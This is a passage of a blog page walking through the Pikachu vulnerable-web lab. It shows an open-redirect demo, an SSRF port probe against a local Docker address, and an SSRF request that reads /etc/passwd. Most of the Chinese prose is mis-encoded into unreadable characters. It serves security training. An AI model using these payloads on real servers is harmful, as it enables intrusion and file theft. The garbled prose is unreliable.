<li>urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu86.png" alt="pikachu86"></p> <p>ç‚¹å‡»<code>æˆ‘å°±æ˜¯æˆ‘,æ”¾è¡ä¸ç¾çš„æˆ‘</code>åï¼Œurlæ›´æ–°ä¸º</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://172.26.239.122/vul/urlredirect/urlredirect.php?url=i
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å°è¯•urlå­—æ®µä¿®æ”¹ä¸ºhttps://www.baidu.com</p> <p>é¡µé¢é‡å®šå‘åˆ°äº†https://www.baidu.comï¼Œè¿™é‡Œæ¶æ„åˆ©ç”¨çš„è¯å¯ä»¥æ­å»ºæ¶æ„ç«™ç‚¹ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»</p> <h1 id="ssrf"><a href="#ssrf" class="header-anchor">#</a> SSRF</h1> <h2 id="ssrf-curl"><a href="#ssrf-curl" class="header-anchor">#</a> SSRF(curl)</h2> <p>ç‚¹å‡»åæ˜¾ç¤ºå¦‚ä¸‹(dockeræ­å»ºçš„ç¯å¢ƒï¼Œæ‰‹åŠ¨ä¿®å¤äº†ä¸‹ipåœ°å€)</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu87.png" alt="pikachu87"></p> <p>å°è¯•ä¿®æ”¹urlå­—æ®µä¸ºhttp://172.26.239.122:3306ï¼Œè¿›è¡ŒSSRFç«¯å£æ¢æµ‹</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu88.png" alt="pikachu88"></p> <p>å…¶ä»–ç«¯å£æ¢æµ‹åŒç†ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ï¼Œdockeråªæ˜ å°„äº†80å’Œ3306ç«¯å£å‡ºæ¥</p> <h2 id="ssrf-file-get-content"><a href="#ssrf-file-get-content" class="header-anchor">#</a> SSRF(file_get_content)</h2> <ul><li>file_get_content å¯ä»¥å¯¹æœ¬åœ°å’Œè¿œç¨‹çš„æ–‡ä»¶è¿›è¡Œè¯»å–</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu89.png" alt="pikachu89"></p> <p>è¿™é‡Œè¯»å–æœ¬åœ°/etc/passwdæ–‡ä»¶</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://172.26.239.122/vul/ssrf/ssrf_fgc.php?file=/etc/passwd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu90.png" alt="pikachu90"></p></div></div> <div class="page-slot page-slot-bottom"><!-- æ¨ªå‘è‡ªé€‚åº” -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=web" title="æ ‡ç­¾">#web</a><a href="/tags/?tag=Pikachu" title="æ ‡ç­¾">#Pikachu</a></div> <div class="last-updated"><span class="prefix">ä¸Šæ¬¡æ›´æ–°:</span> <span class="time">2022/09/25, 18:41:41</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><!----> <a href="/pages/2e1547494524d1c8/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">SUCTF 2019 CheckIn</div></a></div> <div class="page-nav"><p class="inner"><!----> <span class="next"><a href="/pages/2e1547494524d1c8/">SUCTF 2019 CheckIn</a>â†’
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">æœ€è¿‘æ›´æ–°</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/2e1547494524d1d3/"><div>
            0CTF 2016 piapiapia
            <!----></div></a> <span class="date">07-23</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/2e1547494524d1d1/"><div>
            CISCN 2019 åˆèµ› Love
            <!----></div></a> <span class="date">07-22</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/2e1547494524d1d0/"><div>
            PHPååºåˆ—åŒ–
            <!----></div></a> <span class="date">07-21</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">æ›´å¤šæ–‡ç« &gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ZephyrChenWork@outlook.com" title="å‘é‚®ä»¶" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Zephyrccc" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="æœ¬ç«™ä¸»é¢˜">Vdoing</a> 
    | Copyright Â© 2021-2022
    <span>Zephyr | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="è¿”å›é¡¶éƒ¨" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="å»è¯„è®º" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="ä¸»é¢˜æ¨¡å¼" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          è·Ÿéšç³»ç»Ÿ
        </li><li class="iconfont icon-rijianmoshi">
          æµ…è‰²æ¨¡å¼
        </li><li class="iconfont icon-yejianmoshi">
          æ·±è‰²æ¨¡å¼
        </li><li class="iconfont icon-yuedu">
          é˜…è¯»æ¨¡å¼
        </li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><span class="close-but">Ã—</span> <div><!-- å›ºå®š160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.d666345c.js" defer></script><script src="/assets/js/2.2caa9fc9.js" defer></script><script src="/assets/js/8.a8e385a7.js" defer></script>
  </body>
</html>
